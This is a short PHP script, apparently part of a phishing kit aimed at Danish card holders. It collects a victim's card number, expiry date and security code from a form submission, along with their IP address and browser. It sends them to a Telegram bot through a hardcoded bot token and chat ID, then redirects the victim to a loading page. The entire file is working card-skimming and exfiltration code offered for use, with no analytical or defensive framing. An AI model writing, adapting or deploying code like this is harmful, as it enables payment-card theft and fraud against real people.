<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "******🇩🇰***Two***🇩🇰*****\n";
$message .= "Number : ".$_POST['cc']."\n";
$message .= "Exp : ".$_POST['exp']."\n";
$message .= "Code : ".$_POST['code']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------------------------\n";
$token = "6493750576:AAHlXbCRrtrDeo3VgvelLeWj1fFIFL5HWnU";
$data = [
    'text' => $message,
    'chat_id' => '-915905868'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../loadd.html");?>

<?php